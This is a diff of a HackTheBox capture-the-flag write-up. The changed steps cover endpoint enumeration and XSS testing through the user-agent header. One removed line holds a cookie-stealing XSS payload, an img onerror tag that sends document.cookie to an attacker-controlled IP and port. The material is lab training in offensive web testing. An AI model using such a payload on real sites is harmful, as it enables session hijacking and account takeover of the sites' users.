@@ -115,7 +115,14 @@ Nmap done: 1 IP address (1 host up) scanned in 57.08 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/749cf208-f661-4e93-a089-5632c00b64c9)
 
 
-2. Long story short, after scanning for other subdomains, endpoints, or directories, it resulting to none.
+2. Long story short, after scanning for other subdomains, endpoints, or directories, it resulting to none interesting endpoint.
+
+```
+Got 2 results:
+- dashboard (inaccessible, probably need admin role).
+- support.
+```
+
 3. Hence our interest is only at `/support` endpoint.
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7b83bc32-6e57-4ea7-9785-ddb8c7da02e4)
@@ -142,13 +149,8 @@ Nmap done: 1 IP address (1 host up) scanned in 57.08 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/09d37dd9-00dc-4215-9e16-90df99810102)
 
 
-9. Seems we still got the warning, lastly let's identify which request header is vulnerable to XSS.
-10. To test it, let's use burpsuite.
+9. Seems we still got the warning.
+10. Another interest to identify XSS vuln is to test the request header. The most common headers that is injectable with XSS are `referer` and `user-agent`.
+11. Let's try to manipulate the `user-agent` field by dropping the fetch cookie payload there.
 
-```txt
-PAYLOAD:
-
-<img src=x onerror="this.src='http://10.10.16.64:1337/?'+document.cookie; this.removeAttribute('onerror');"> 
-```
-
-10. Let's send it using burpsuite.
+ 
